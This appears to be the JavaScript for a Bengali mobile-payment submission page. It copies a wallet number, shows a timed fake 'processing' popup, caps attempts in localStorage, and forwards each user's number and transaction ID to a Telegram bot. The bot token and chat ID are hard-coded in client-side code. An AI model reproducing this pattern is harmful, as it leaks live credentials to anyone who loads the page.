function copyNumber() {
  const number = '01997747613';
  navigator.clipboard.writeText(number);
  alert('নাম্বার কপি হয়েছে!');
}

function submitPayment() {
  const userNumber = document.getElementById('user-number').value;
  const transactionId = document.getElementById('transaction-id').value;

  if (!userNumber || !transactionId) {
    alert('সব তথ্য দিন!');
    return;
  }

  const limit = localStorage.getItem('submitLimit') || 0;
  if (limit >= 3) {
    showHelpPopup();
    return;
  }

  document.getElementById('popup').style.display = 'block';

  setTimeout(() => {
    document.getElementById('popup').style.display = 'none';
    document.getElementById('success-popup').style.display = 'block';
    localStorage.setItem('submitLimit', parseInt(limit) + 1);

    const telegramBotToken = '7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec';
    const chatId = '7294674899';
    const message = `পেমেন্ট রিকোয়েস্ট:\nনাম্বার: ${userNumber}\nট্রানজেকশন আইডি: ${transactionId}`;
    
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);

    setTimeout(() => {
      document.getElementById('success-popup').style.display = 'none';
    }, 3000);
  }, 10000);
}

function showHelpPopup() {
  alert('আপনি ৩ বার চেষ্টা করেছেন! সাহায্যের জন্য টেলিগ্রামে যোগাযোগ করুন।');
  window.location.href = 'https://t.me/helpcenterexample';
}
